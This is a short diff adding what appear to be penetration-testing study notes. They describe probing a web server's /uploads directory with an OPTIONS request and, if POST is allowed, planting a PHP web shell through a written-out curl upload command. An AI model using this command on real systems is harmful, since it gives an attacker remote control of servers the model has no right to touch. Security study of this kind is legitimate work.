@@ -1,0 +1,4 @@
+- Only thing new to remember:
+	- If there is a /uploads route with index on, we can check if we can send a POST Request to upload a webshell.
+	- Begin by intercepting request GET and replace by OPTIONS to see what methods are allowed. If POST is alllowed (php exemple) :
+		- curl http://<ip>/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php
